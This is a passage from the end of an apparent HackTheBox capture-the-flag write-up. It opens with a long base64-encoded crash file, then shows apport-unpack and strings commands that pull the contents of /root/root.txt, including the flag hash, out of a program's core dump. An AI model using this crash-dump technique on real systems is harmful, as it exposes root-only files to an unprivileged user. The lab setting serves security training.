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
apport-unpack _opt_count.1000.crash /tmp/oopsie
strings -n8 /tmp/oopsie/CoreDump
# Save results a file? [y/N]: Path: 
# oot/root.txt
# fee75b455935667d518c2890652f3306
# initgroups
# netgroup
# networks
```

The raw dump is inedible but the unpacking tool works perfectly. There's the
secret in the environment variable and the flag.

[author-profile]: https://app.hackthebox.com/users/485024

[download-sources]: images/screenshots/download-sources.png
